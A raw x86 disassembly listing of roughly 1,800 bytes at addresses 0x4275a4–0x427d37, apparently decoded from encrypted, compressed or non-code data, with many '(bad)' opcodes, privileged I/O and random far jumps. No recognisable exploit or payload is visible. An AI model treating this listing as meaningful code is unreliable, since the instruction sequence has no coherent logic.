  4275a4:	xor    BYTE PTR [ebx-0x391e0227],cl
  4275aa:	stos   BYTE PTR es:[edi],al
  4275ab:	or     DWORD PTR [edx],edx
  4275ad:	test   eax,0x7f6f6a87
  4275b2:	pop    ss
  4275b3:	jle    0x4275eb
  4275b5:	retf   0xeea9
  4275b8:	clc    
  4275b9:	dec    esp
  4275ba:	ins    DWORD PTR es:[edi],dx
  4275bb:	int3   
  4275bc:	cld    
  4275bd:	xchg   esp,eax
  4275be:	out    0xb0,eax
  4275c0:	inc    edi
  4275c1:	fdivr  QWORD PTR [edx]
  4275c3:	mov    al,0x68
  4275c5:	pop    esp
  4275c6:	dec    edx
  4275c7:	mov    dh,0x96
  4275c9:	xlat   BYTE PTR ds:[ebx]
  4275ca:	lds    esp,FWORD PTR [edx+0x17164f51]
  4275d0:	lods   eax,DWORD PTR ds:[esi]
  4275d1:	mov    al,0x2b
  4275d3:	lahf   
  4275d4:	fdivr  st,st(5)
  4275d6:	xchg   edi,eax
  4275d7:	dec    esp
  4275d8:	xchg   ebx,eax
  4275d9:	daa    
  4275da:	cs sbb al,0xe2
  4275dd:	sbb    BYTE PTR [ebx+0x20],al
  4275e0:	dec    ecx
  4275e1:	daa    
  4275e2:	mov    al,ds:0x6d21b77
  4275e7:	add    bh,BYTE PTR [edi+0x49]
  4275ea:	clc    
  4275eb:	lods   al,BYTE PTR ds:[esi]
  4275ec:	push   ss
  4275ed:	mov    ebp,0x29b86406
  4275f2:	ss push ebx
  4275f4:	dec    esp
  4275f5:	leave  
  4275f6:	js     0x427585
  4275f8:	shr    BYTE PTR es:[edi+0x6d],cl
  4275fc:	cwde   
  4275fd:	or     ebp,DWORD PTR [eax+0x3fce8750]
  427603:	imul   eax,DWORD PTR [esi+0x35124de9],0x5924fd21
  42760d:	sar    DWORD PTR [ebp-0x7d],0xf2
  427611:	adc    ah,BYTE PTR [eax]
  427613:	adc    edi,DWORD PTR [edi-0x7bcb1c4a]
  427619:	mov    eax,ds:0xdd0cbf4a
  42761e:	xchg   BYTE PTR [edx],cl
  427620:	xchg   edi,eax
  427621:	adc    bl,BYTE PTR [edx-0x36]
  427624:	xchg   di,ax
  427626:	ror    ah,1
  427628:	int    0xc2
  42762a:	pop    ebp
  42762b:	xchg   dh,bl
  42762d:	icebp  
  42762e:	push   ecx
  42762f:	jle    0x427659
  427631:	bound  ebp,QWORD PTR [edi+0x30]
  427634:	(bad)  
  427635:	fdiv   QWORD PTR [esi-0xc8ee45]
  42763b:	xor    ecx,ecx
  42763d:	or     bh,BYTE PTR [esi+0x39c8a396]
  427643:	add    eax,0x29fc2db9
  427648:	mov    WORD PTR [esi],fs
  42764a:	mov    ch,0xf3
  42764c:	xchg   edi,eax
  42764d:	mov    esp,DWORD PTR [eax-0x1b62b2ef]
  427653:	(bad)  
  427654:	scas   al,BYTE PTR es:[edi]
  427655:	in     al,dx
  427656:	jbe    0x4276ba
  427658:	jle    0x4276a4
  42765a:	(bad)  
  42765b:	lahf   
  42765c:	push   ebx
  42765d:	xor    al,0x35
  42765f:	aad    0x5d
  427661:	retf   0x1578
  427664:	mov    eax,ds:0x46e28466
  427669:	js     0x427698
  42766b:	cmp    edx,ebp
  42766d:	mov    ebp,0xf29ba00d
  427672:	pop    edx
  427673:	lods   al,BYTE PTR ds:[esi]
  427674:	or     al,BYTE PTR [eax]
  427676:	push   0xffffffb7
  427678:	fcom   QWORD PTR [edx+0x2]
  42767b:	fmulp  st(1),st
  42767d:	cmp    DWORD PTR ds:0x76e8067f,0xbf85e70b
  427687:	fcos   
  427689:	test   BYTE PTR [ebx+0x589fcb70],cl
  42768f:	inc    edx
  427690:	sbb    dl,BYTE PTR [edx+0x4f]
  427693:	in     eax,0xfd
  427695:	pusha  
  427696:	and    esi,DWORD PTR [ecx]
  427698:	outs   dx,BYTE PTR ds:[esi]
  427699:	fld    QWORD PTR [edx]
  42769b:	xchg   ebx,eax
  42769c:	and    ch,BYTE PTR [eax+0x31]
  42769f:	jno    0x427664
  4276a1:	cli    
  4276a2:	dec    ebp
  4276a3:	add    eax,0xa49f781d
  4276a8:	xor    ebp,ecx
  4276aa:	push   ebx
  4276ab:	iret   
  4276ac:	pop    eax
  4276ad:	int3   
  4276ae:	jmp    0xe61c29bb
  4276b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276b4:	ret    0x902f
  4276b7:	call   0x8751083d
  4276bc:	inc    DWORD PTR [eax]
  4276be:	add    BYTE PTR [eax],al
  4276c0:	add    BYTE PTR [eax],al
  4276c2:	or     al,ah
  4276c4:	mov    eax,ds:0x5ef7eff7
  4276c9:	std    
  4276ca:	mov    ebp,0xa2f91c3b
  4276cf:	sbb    eax,0xee94f6fe
  4276d4:	add    DWORD PTR [eax],eax
  4276d6:	repz add al,0x0
  4276d9:	add    BYTE PTR [edi-0x49c71597],dh
  4276df:	dec    ebp
  4276e0:	xor    eax,0x55ad33b5
  4276e5:	mov    dl,0xc7
  4276e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276e8:	jg     0x4276f0
  4276ea:	inc    ecx
  4276eb:	cdq    
  4276ec:	out    dx,al
  4276ed:	xchg   ebx,eax
  4276ee:	sbb    eax,0x4331de0b
  4276f3:	ins    DWORD PTR es:[edi],dx
  4276f4:	jg     0x4276a0
  4276f6:	jp     0x427766
  4276f8:	int3   
  4276f9:	in     eax,dx
  4276fa:	mov    al,cl
  4276fc:	and    BYTE PTR [ebp+0x2a],bh
  4276ff:	imul   ebx,edx,0x6f
  427702:	push   edi
  427703:	mov    WORD PTR [edi],es
  427705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427706:	mov    WORD PTR [edi+esi*2-0x312b9cf3],fs
  42770d:	stos   BYTE PTR es:[edi],al
  42770e:	sbb    DWORD PTR [edi+0x480f1675],ecx
  427714:	fld    QWORD PTR [edx]
  427716:	inc    ebp
  427717:	js     0x4276d2
  427719:	push   ebx
  42771a:	push   esp
  42771b:	and    esi,esp
  42771d:	scas   al,BYTE PTR es:[edi]
  42771e:	cmp    eax,0x4bd6fb79
  427723:	fmul   QWORD PTR [esi+0x3]
  427726:	in     al,dx
  427727:	cmp    dl,dh
  427729:	fwait
  42772a:	or     eax,0xc7cced5c
  42772f:	dec    ebx
  427730:	xchg   esp,eax
  427731:	pusha  
  427732:	inc    esp
  427733:	call   DWORD PTR [edi+0x2e]
  427736:	(bad)  [edx+0x37f2a929]
  42773c:	sbb    BYTE PTR [ecx+0x20bcce80],bl
  427742:	push   ebp
  427743:	or     eax,0x55a9b1ed
  427748:	xchg   esp,eax
  427749:	push   ebp
  42774a:	je     0x8f7cea53
  427750:	sbb    al,0x63
  427752:	sets   BYTE PTR [edx+0x3b0e620c]
  427759:	sbb    bh,BYTE PTR [esi+0x45]
  42775c:	mov    dl,0xfd
  42775e:	push   ecx
  42775f:	mov    eax,eax
  427761:	out    0xd6,eax
  427763:	sar    BYTE PTR [ecx],1
  427765:	xchg   esi,eax
  427766:	mov    bl,0x58
  427768:	rol    BYTE PTR [eax-0x68b4c5bc],cl
  42776e:	and    eax,DWORD PTR ds:0x4f30c9f5
  427774:	frstor [ebp+0x21]
  427777:	icebp  
  427778:	mov    ebx,0x70586ddc
  42777d:	(bad)  
  42777f:	pop    eax
  427780:	pop    ecx
  427781:	outs   dx,BYTE PTR ds:[esi]
  427782:	mov    cl,0xba
  427784:	iret   
  427785:	and    ebp,DWORD PTR [esi-0x62204ebe]
  42778b:	inc    ebp
  42778c:	dec    esp
  42778d:	cmp    al,0x1e
  42778f:	iret   
  427790:	test   al,0x9e
  427792:	mov    esi,0x5c21c3e7
  427797:	inc    ebp
  427798:	jp     0x4277e1
  42779a:	daa    
  42779b:	adc    DWORD PTR [esi-0x7a],esp
  42779e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42779f:	mul    DWORD PTR [ecx-0x361e76bb]
  4277a5:	fistp  QWORD PTR [edx-0x5f9774d8]
  4277ab:	mov    ebp,0x5ef7977a
  4277b0:	xlat   BYTE PTR ds:[ebx]
  4277b1:	inc    edx
  4277b2:	xchg   esp,eax
  4277b3:	(bad)  
  4277b4:	xchg   ecx,eax
  4277b5:	popf   
  4277b6:	gs test eax,0x22bd98a8
  4277bc:	fwait
  4277bd:	das    
  4277be:	stos   DWORD PTR es:[edi],eax
  4277bf:	xor    dl,BYTE PTR [ecx+0x201ffdd8]
  4277c5:	rcr    bh,0x96
  4277c8:	popa   
  4277c9:	outs   dx,DWORD PTR ds:[esi]
  4277ca:	mov    eax,0x11506
  4277cf:	adc    DWORD PTR [eax],0xffffff80
  4277d2:	imul   ebp,edi,0xf2a2fc5a
  4277d8:	shl    DWORD PTR [ecx+0x1e771a78],cl
  4277de:	xchg   esp,eax
  4277df:	dec    esi
  4277e0:	and    eax,0x7b620a1
  4277e5:	loop   0x42776e
  4277e7:	xchg   ebp,eax
  4277e8:	shl    BYTE PTR [edx+0x4d],0x52
  4277ec:	mov    ebx,0x4870de76
  4277f1:	shl    cl,0xb3
  4277f4:	(bad)  
  4277f5:	mov    ecx,0x25f72ba7
  4277fa:	pop    ebp
  4277fb:	adc    eax,0xb08b2452
  427800:	cs popf 
  427802:	retf   
  427803:	mov    dh,0xb8
  427805:	outs   dx,BYTE PTR ds:[esi]
  427806:	mov    bh,0x48
  427808:	cmp    BYTE PTR [eax+0x44],0xc8
  42780c:	rcl    BYTE PTR [ebp+eax*4-0x48],1
  427810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427811:	xor    bh,0x3e
  427814:	add    DWORD PTR [eax],ebp
  427816:	jecxz  0x427859
  427818:	or     BYTE PTR [esi+0x6f084430],0x9d
  42781f:	sbb    al,0x34
  427821:	xlat   BYTE PTR ds:[ebx]
  427822:	inc    esi
  427823:	jo     0x4277d2
  427825:	push   es
  427826:	lods   al,BYTE PTR ds:[esi]
  427827:	jno    0x427805
  427829:	cmp    bl,ah
  42782b:	cld    
  42782c:	inc    edx
  42782d:	(bad)  
  42782e:	loop   0x42789c
  427830:	jge    0x427856
  427832:	fsubr  QWORD PTR [edx+0x29a276fb]
  427838:	push   ebp
  427839:	mov    bl,0xdd
  42783b:	jnp    0x42788e
  42783d:	mov    al,ds:0xa4a67487
  427842:	jl     0x4278c1
  427844:	loope  0x42784c
  427846:	jae    0x427879
  427848:	shl    BYTE PTR [ebx-0x24bc95aa],cl
  42784e:	and    BYTE PTR [edx-0x56],ah
  427851:	or     ecx,edx
  427853:	jmp    0x83ed5f3b
  427858:	dec    ecx
  427859:	pusha  
  42785a:	push   ecx
  42785b:	icebp  
  42785c:	lea    esi,es:[edx]
  42785f:	xor    bh,BYTE PTR [edx]
  427861:	mov    ebx,0xd99722e0
  427866:	retf   
  427867:	lock dec edi
  427869:	stc    
  42786a:	ss mov bl,0xa8
  42786d:	cmp    eax,0x6423db0e
  427872:	fs inc ebp
  427874:	jo     0x4277f8
  427876:	daa    
  427877:	adc    ebp,DWORD PTR ds:0xb39bd120
  42787d:	mov    eax,ds:0xe0fb6269
  427882:	jle    0x42780c
  427884:	xchg   ecx,eax
  427885:	mov    dh,0x7a
  427887:	leave  
  427888:	add    DWORD PTR ds:0xd5ceb83d,ebp
  42788e:	scas   eax,DWORD PTR es:[edi]
  42788f:	fs nop
  427891:	rol    cl,0xba
  427894:	lds    eax,FWORD PTR [ebx-0xa]
  427897:	pop    esp
  427898:	je     0x4278df
  42789a:	shl    esp,cl
  42789c:	hlt    
  42789d:	jecxz  0x42785b
  42789f:	mov    cl,0xa3
  4278a1:	(bad)  [ebx+0x28]
  4278a4:	pop    ebp
  4278a5:	lods   al,BYTE PTR ds:[esi]
  4278a6:	adc    DWORD PTR [ecx-0x702074fe],edi
  4278ac:	mov    al,BYTE PTR [eax-0x295c5c1d]
  4278b2:	dec    edx
  4278b3:	lahf   
  4278b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278b5:	or     al,0xb7
  4278b7:	push   ds
  4278b8:	inc    esp
  4278ba:	pop    esi
  4278bb:	xchg   esi,eax
  4278bc:	ret    
  4278bd:	pop    edi
  4278be:	aaa    
  4278bf:	in     eax,0x62
  4278c1:	add    al,0xd0
  4278c3:	cmp    al,0x4e
  4278c5:	mov    dh,0xbc
  4278c7:	idiv   BYTE PTR [edx+0x63]
  4278ca:	int3   
  4278cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278cc:	jbe    0x42789b
  4278ce:	arpl   WORD PTR [ecx],di
  4278d0:	dec    edi
  4278d1:	retf   0x387b
  4278d4:	(bad)  
  4278d5:	xchg   esp,eax
  4278d6:	push   ebp
  4278d7:	or     BYTE PTR [edi],dh
  4278d9:	(bad)  
  4278da:	in     eax,dx
  4278db:	fs and edi,0x3008dbd0
  4278e2:	inc    esi
  4278e3:	xor    eax,0xfd575c23
  4278e8:	mov    bh,0x9b
  4278ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278eb:	stos   BYTE PTR es:[edi],al
  4278ec:	nop
  4278ed:	popa   
  4278ee:	cmp    al,0x7f
  4278f0:	add    bl,BYTE PTR [ebp+0x166052aa]
  4278f6:	aad    0x2c
  4278f8:	xchg   ebp,eax
  4278f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278fa:	cmp    DWORD PTR [ebx-0x4cc08351],esp
  427900:	lds    ebp,FWORD PTR [eax]
  427902:	push   ds
  427903:	adc    DWORD PTR [ebp+0xd2665c9],edi
  427909:	int    0x76
  42790b:	jmp    0x7b10:0xfbc0af32
  427912:	xchg   DWORD PTR [ecx],ecx
  427914:	add    DWORD PTR ds:0x18294df7,0xffffffdb
  42791b:	add    BYTE PTR [ecx],0x16
  42791e:	push   es
  42791f:	rcl    DWORD PTR [ebp+ebp*4+0xb],1
  427923:	cwde   
  427924:	rol    BYTE PTR [ebx],0xc6
  427927:	mov    al,0xee
  427929:	jae    0x42794d
  42792b:	stos   BYTE PTR es:[edi],al
  42792c:	loopne 0x427960
  42792e:	das    
  42792f:	outs   dx,BYTE PTR cs:[esi]
  427931:	cmc    
  427932:	stos   BYTE PTR es:[edi],al
  427933:	pusha  
  427934:	adc    ecx,DWORD PTR [ebp+0x35]
  427937:	mov    ah,0xb8
  427939:	aas    
  42793a:	xchg   ebp,eax
  42793b:	adc    DWORD PTR [ebx],0xffffffc9
  42793e:	jmp    0x31d84f65
  427943:	fwait
  427944:	mov    edi,0x8c8624d8
  427949:	dec    eax
  42794a:	push   ds
  42794b:	sub    al,0x1b
  42794d:	or     al,0x2b
  42794f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427950:	fcom   QWORD PTR [esi]
  427952:	arpl   WORD PTR [ebx+esi*2-0xd],si
  427956:	std    
  427957:	in     al,dx
  427958:	mov    dl,BYTE PTR [edi-0x492db2e5]
  42795e:	cdq    
  42795f:	mov    eax,0x5ba3082e
  427964:	mov    edx,0x7b69a51e
  427969:	add    ebx,DWORD PTR [esi-0x3b]
  42796c:	pop    ebp
  42796d:	dec    BYTE PTR [eax]
  42796f:	jg     0x427971
  427971:	fdiv   DWORD PTR [edi-0x64]
  427974:	fwait
  427975:	dec    edi
  427976:	push   ecx
  427977:	les    ebx,FWORD PTR [ecx+0x18ba27c2]
  42797d:	(bad)  [esi-0x5f]
  427980:	scas   al,BYTE PTR es:[edi]
  427981:	jb     0x4279e7
  427983:	aad    0x47
  427985:	sbb    ecx,DWORD PTR [edx+0x6a865325]
  42798b:	pop    es
  42798c:	adc    DWORD PTR [ecx+0xc],edx
  42798f:	jb     0x4279b4
  427991:	stc    
  427992:	idiv   BYTE PTR [esi]
  427994:	lahf   
  427995:	jbe    0x4279a4
  427997:	or     DWORD PTR [ebp-0x42],esp
  42799a:	ins    BYTE PTR es:[edi],dx
  42799b:	sbb    bh,ah
  42799d:	cmc    
  42799e:	pop    edi
  42799f:	push   ds
  4279a0:	or     bl,cl
  4279a2:	jnp    0x4279c4
  4279a4:	and    al,0xc3
  4279a6:	aam    0x83
  4279a8:	push   ebp
  4279a9:	cld    
  4279aa:	push   ecx
  4279ab:	ins    DWORD PTR es:[edi],dx
  4279ac:	ret    
  4279ad:	jae    0x427959
  4279af:	hlt    
  4279b0:	xchg   ebx,eax
  4279b1:	add    DWORD PTR [ecx+0x1c],esi
  4279b4:	inc    esp
  4279b5:	sbb    DWORD PTR ds:0x38b9d80f,0x5572f56b
  4279bf:	fcmovnb st,st(1)
  4279c1:	mov    esi,0xe502a950
  4279c6:	icebp  
  4279c7:	les    esp,FWORD PTR [eax-0x6fa9c837]
  4279cd:	pop    esi
  4279ce:	sub    ebx,DWORD PTR [ebp-0x46]
  4279d1:	add    esp,DWORD PTR [ebx]
  4279d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279d4:	hlt    
  4279d5:	push   esi
  4279d6:	sub    al,0x51
  4279d8:	popa   
  4279d9:	repnz adc eax,0x3cf26fe3
  4279df:	push   0x78
  4279e1:	sub    al,0xe1
  4279e3:	push   ecx
  4279e4:	ds ret 
  4279e6:	or     DWORD PTR [eax-0x19],ebp
  4279e9:	(bad)  
  4279ea:	in     al,0xd6
  4279ec:	test   BYTE PTR [edx],ch
  4279ee:	dec    ebx
  4279ef:	clc    
  4279f0:	pop    ds
  4279f1:	push   ds
  4279f2:	adc    dl,bl
  4279f4:	test   eax,0x6ca3cbfc
  4279f9:	xor    al,0xfb
  4279fb:	pop    ss
  4279fc:	inc    esi
  4279fd:	add    DWORD PTR ds:0xdf955bd1,0x3ed4a03
  427a07:	hlt    
  427a08:	add    eax,0xe160f0d8
  427a0d:	aaa    
  427a0e:	xchg   ecx,eax
  427a0f:	mov    ah,0xa7
  427a11:	ficomp DWORD PTR [ebx+0x8]
  427a14:	sub    dl,BYTE PTR ds:0x407416ef
  427a1a:	test   BYTE PTR [esi+0x6d13e26d],ah
  427a20:	cwde   
  427a21:	xor    al,0x59
  427a23:	inc    eax
  427a24:	stc    
  427a25:	jae    0x427a1e
  427a27:	add    eax,0xb5c6199e
  427a2c:	(bad)  
  427a2d:	dec    ecx
  427a2e:	push   0xe505cf2a
  427a33:	ror    DWORD PTR [esi],1
  427a35:	jb     0x4279c6
  427a37:	ret    0xd94c
  427a3a:	in     al,0xcd
  427a3c:	outs   dx,BYTE PTR ds:[esi]
  427a3d:	inc    eax
  427a3e:	inc    edx
  427a3f:	fadd   DWORD PTR [eax+0x22559e36]
  427a45:	popf   
  427a46:	fmul   DWORD PTR [ebx-0x6498b8fd]
  427a4c:	nop
  427a4d:	repz mov esi,0xeb6ee73f
  427a53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a54:	adc    DWORD PTR [ecx+0x31f81d8e],edi
  427a5a:	sbb    BYTE PTR [ebx-0x257fc741],0xad
  427a61:	out    0x9,eax
  427a63:	pop    ds
  427a64:	sub    al,0xb9
  427a66:	pop    esp
  427a67:	push   esi
  427a68:	out    0xd8,al
  427a6a:	adc    al,0x3e
  427a6c:	addr16 (bad) 
  427a6e:	pushf  
  427a6f:	test   DWORD PTR [ecx-0x3f486c48],esi
  427a75:	bnd jg 0x427a8d
  427a78:	out    dx,al
  427a79:	push   ebp
  427a7a:	sbb    esp,DWORD PTR [esi-0x2e734b49]
  427a80:	xchg   ebp,eax
  427a81:	mov    DWORD PTR [ebx],eax
  427a83:	ret    
  427a84:	es and esp,esp
  427a87:	dec    ebx
  427a88:	xchg   BYTE PTR [edi],dh
  427a8a:	mov    ah,BYTE PTR [esi-0x6d]
  427a8d:	stc    
  427a8e:	add    BYTE PTR [ebp+0x6b],0xfa
  427a92:	add    edi,DWORD PTR [eax+0x4c2eb8f2]
  427a98:	ror    DWORD PTR [eax+0x1f],cl
  427a9b:	push   edi
  427a9c:	jmp    0xc047:0xf79cf1b0
  427aa3:	ja     0x427a55
  427aa5:	js     0x427aae
  427aa7:	cmp    BYTE PTR [ecx-0x30],bh
  427aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aab:	hlt    
  427aac:	jb     0x427a44
  427aae:	jl     0x427a9c
  427ab0:	push   eax
  427ab1:	stc    
  427ab2:	cld    
  427ab3:	sbb    eax,0xa44f3315
  427ab8:	pop    edx
  427ab9:	xchg   DWORD PTR [edi+0x38],edx
  427abc:	call   DWORD PTR [ebx]
  427abe:	les    eax,FWORD PTR [ecx-0x6611ca6b]
  427ac4:	sub    DWORD PTR [ebp+0x19705f61],0x66baf5f8
  427ace:	rcr    BYTE PTR [eax+0xe],cl
  427ad1:	nop    DWORD PTR [ebx]
  427ad4:	stc    
  427ad5:	mov    BYTE PTR [eax],bh
  427ad7:	xor    BYTE PTR [edx],bh
  427ad9:	lock arpl WORD PTR [edi+0x7c],bp
  427add:	in     al,dx
  427ade:	ret    
  427adf:	frstor [eax+0x48]
  427ae2:	iret   
  427ae3:	or     ebp,ebx
  427ae5:	loope  0x427ae4
  427ae7:	xor    DWORD PTR [esi+0x231543ef],edi
  427aed:	(bad)  
  427aee:	xchg   edx,eax
  427aef:	rcl    BYTE PTR [edx-0x365f917c],0x1f
  427af6:	push   ss
  427af7:	gs cdq 
  427af9:	pop    ebx
  427afa:	rcr    esp,1
  427afc:	push   0x966a08b3
  427b01:	inc    BYTE PTR [ecx+0x364b6a2]
  427b07:	mov    ebx,0x53d57aa0
  427b0c:	std    
  427b0d:	jmp    0x427b88
  427b0f:	push   es
  427b10:	or     DWORD PTR ds:0x9ab2a1aa,esp
  427b16:	push   ecx
  427b17:	inc    ebx
  427b18:	scas   al,BYTE PTR es:[edi]
  427b19:	mov    WORD PTR [ecx],ds
  427b1b:	fnstcw WORD PTR [ebx]
  427b1d:	imul   edi,DWORD PTR [ecx+0x4f7cc02],0xb312e185
  427b27:	sbb    BYTE PTR [edi-0x65579df4],ah
  427b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b2e:	int    0x2c
  427b30:	imul   eax,DWORD PTR [edi-0x5b06dfff],0x5ae27cbf
  427b3a:	lock ret 
  427b3c:	push   ebp
  427b3d:	add    bh,BYTE PTR [esi]
  427b3f:	arpl   WORD PTR [edx+0xde170fc],cx
  427b45:	retf   
  427b46:	repnz imul BYTE PTR [esi+0x7d]
  427b4a:	pop    ds
  427b4b:	addr16 in eax,0x76
  427b4e:	dec    ebp
  427b4f:	rol    BYTE PTR [edx],cl
  427b51:	retf   0x98f4
  427b54:	jo     0x427bd2
  427b56:	cmp    dl,bh
  427b58:	das    
  427b59:	xor    BYTE PTR [esi],0x16
  427b5c:	aad    0xd1
  427b5e:	and    eax,0xa0a7402f
  427b63:	jl     0x427b4f
  427b65:	add    bl,BYTE PTR fs:[ebp+0x26]
  427b69:	out    dx,al
  427b6a:	je     0x427b64
  427b6c:	cld    
  427b6d:	jne    0x427b5b
  427b6f:	add    al,0xa2
  427b71:	btc    DWORD PTR [eax+0x69101a72],ebx
  427b78:	sub    al,BYTE PTR [ebp-0x67f0254c]
  427b7e:	repnz and BYTE PTR ds:0x1624f7af,bh
  427b85:	inc    eax
  427b86:	mov    cl,0x7b
  427b88:	nop
  427b89:	cmp    bl,ah
  427b8b:	adc    bl,BYTE PTR [edx+0x57]
  427b8e:	sub    esp,DWORD PTR [edx-0x77]
  427b91:	(bad)
  427b94:	xor    ecx,ebp
  427b96:	call   0xada192a5
  427b9b:	inc    esi
  427b9c:	sub    ch,BYTE PTR [ebx]
  427b9e:	sub    al,0x82
  427ba0:	xor    al,0x57
  427ba2:	or     eax,0x9500ac00
  427ba7:	pop    esp
  427ba8:	int    0x15
  427baa:	mov    edi,0x578ca02
  427baf:	fwait
  427bb0:	sar    BYTE PTR [ecx-0x7a],1
  427bb3:	fidiv  WORD PTR [edi]
  427bb5:	mov    bh,0x77
  427bb7:	outs   dx,DWORD PTR ds:[esi]
  427bb8:	call   0x9fa1:0xdb97f8be
  427bbf:	out    dx,eax
  427bc0:	sbb    DWORD PTR [edx-0x1d7c7d7d],esp
  427bc6:	es movs WORD PTR es:[edi],WORD PTR ds:[esi]
  427bca:	mov    esi,0x766f
  427bcf:	add    BYTE PTR [eax],al
  427bd1:	add    BYTE PTR [edi-0xa],dh
  427bd4:	push   ecx
  427bd5:	dec    edi
  427bd6:	shr    edi,1
  427bd8:	jg     0x427bd8
  427bda:	push   cs
  427bdb:	mov    edi,0x2aeee2d0
  427be0:	xor    edi,DWORD PTR [ebx+0x1f387]
  427be6:	repz add al,0x0
  427be9:	add    bl,cl
  427beb:	jb     0x427b6d
  427bed:	(bad)  
  427bee:	xor    dh,BYTE PTR [esi]
  427bf0:	arpl   WORD PTR [esi+0x1912fd93],di
  427bf6:	pop    ss
  427bf7:	xchg   esi,eax
  427bf8:	pop    esp
  427bf9:	or     ebx,DWORD PTR [ebx+0x2fab05e2]
  427bff:	outs   dx,BYTE PTR ds:[esi]
  427c00:	push   0x9e76f195
  427c05:	daa    
  427c06:	sbb    eax,0x20d23bfe
  427c0b:	xchg   ecx,eax
  427c0c:	cmp    esp,DWORD PTR [ecx]
  427c0e:	aam    0xc1
  427c10:	xor    al,0x84
  427c12:	aas    
  427c13:	std    
  427c14:	popa   
  427c15:	xor    al,0x24
  427c17:	inc    esi
  427c18:	scas   eax,DWORD PTR es:[edi]
  427c19:	jmp    0x39cc4857
  427c1e:	cs int3 
  427c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c21:	mov    edx,0x76b9c42
  427c26:	aaa    
  427c27:	in     al,0x85
  427c29:	xchg   ebx,edx
  427c2b:	fwait
  427c2c:	outs   dx,DWORD PTR ds:[esi]
  427c2d:	out    dx,eax
  427c2e:	cdq    
  427c2f:	jo     0x427c08
  427c31:	test   DWORD PTR [ebp-0x3b085779],0xb8522cd1
  427c3b:	jbe    0x427c81
  427c3d:	mov    eax,0x6ef75de0
  427c42:	pop    ss
  427c43:	sub    BYTE PTR ds:0x93b18ac3,dl
  427c49:	and    BYTE PTR [esi],bl
  427c4b:	int3   
  427c4c:	fwait
  427c4d:	push   esi
  427c4e:	cmp    al,0x27
  427c50:	add    eax,0x2b27e6a6
  427c55:	les    eax,FWORD PTR ds:0xbd5f0e8c
  427c5b:	adc    esi,DWORD PTR [edx]
  427c5d:	jo     0x427c94
  427c5f:	call   0x73:0x67c4cdf7
  427c66:	adc    eax,0xe04d5efc
  427c6b:	lahf   
  427c6c:	xor    eax,0x600cfb2c
  427c71:	xchg   esi,eax
  427c72:	xchg   edx,eax
  427c73:	mov    ecx,0x8add692f
  427c78:	push   0x75
  427c7a:	(bad)  
  427c7b:	fmul   DWORD PTR [esi-0x749a8037]
  427c81:	push   0x43
  427c83:	xor    BYTE PTR [ebp-0x702f6a28],al
  427c89:	mov    ebp,eax
  427c8b:	mov    DWORD PTR [ebx+0x41],esi
  427c8e:	adc    DWORD PTR [esi+0x1b],ecx
  427c91:	fimul  DWORD PTR [eax-0x67]
  427c94:	sbb    bl,cl
  427c96:	pop    edx
  427c97:	mov    eax,0xf7674c6f
  427c9c:	fs push 0x21
  427c9f:	out    0xb7,al
  427ca1:	pop    ecx
  427ca2:	inc    ebp
  427ca3:	in     al,dx
  427ca4:	add    DWORD PTR [eax-0x5e],0x75
  427ca8:	aaa    
  427ca9:	daa    
  427caa:	(bad)  
  427cab:	mov    bl,0x3d
  427cad:	test   DWORD PTR [edi],0x9f990d3d
  427cb3:	ins    DWORD PTR es:[edi],dx
  427cb4:	mov    bh,BYTE PTR [ecx+edi*2]
  427cb7:	in     al,dx
  427cb8:	pop    esp
  427cb9:	jp     0x427c53
  427cbb:	test   DWORD PTR [esi],ebp
  427cbd:	and    al,BYTE PTR [edx-0x21d4957e]
  427cc3:	adc    eax,0x8ef77f65
  427cc8:	dec    edx
  427cc9:	(bad)  
  427cca:	bound  edx,QWORD PTR [ebp-0x56]
  427ccd:	aam    0xfa
  427ccf:	daa    
  427cd0:	shl    ch,0x76
  427cd3:	sub    esi,DWORD PTR [ecx+0x5d]
  427cd6:	xchg   ebp,eax
  427cd7:	lahf   
  427cd8:	or     eax,0x1b35a976
  427cdd:	jle    0x427c6f
  427cdf:	nop
  427ce0:	inc    ebp
  427ce1:	xchg   BYTE PTR [ebp+0x36],cl
  427ce4:	adc    DWORD PTR [ecx+esi*1+0x5],ecx
  427ce8:	loop   0x427d1e
  427cea:	mov    BYTE PTR [ebp+eax*1-0x28],bl
  427cee:	jns    0x427ce4
  427cf0:	bound  eax,QWORD PTR [edx]
  427cf2:	dec    eax
  427cf3:	pop    edi
  427cf4:	(bad)  
  427cf5:	daa    
  427cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cf7:	and    ah,0xeb
  427cfa:	dec    ebp
  427cfb:	push   ss
  427cfc:	jmp    0x23ca:0xa56d8b
  427d03:	dec    esi
  427d04:	mov    esp,0x8fae5e82
  427d09:	or     edx,DWORD PTR ds:0x93330556
  427d0f:	stos   DWORD PTR es:[edi],eax
  427d10:	mov    eax,0xfee32ed
  427d15:	les    esp,FWORD PTR ds:0x52aec3c2
  427d1b:	and    DWORD PTR [esi-0x2b],ecx
  427d1e:	push   ebx
  427d1f:	iret   
  427d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d21:	leave  
  427d22:	cs dec ebp
  427d24:	(bad)  
  427d25:	clc    
  427d26:	gs xchg edi,eax
  427d28:	cli    
  427d29:	fst    DWORD PTR [edi-0x5e]
  427d2c:	out    dx,al
  427d2d:	inc    esi
  427d2e:	and    ax,0x760b
  427d32:	(bad)  
  427d33:	pop    ebx
  427d34:	jno    0x427ccc
  427d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
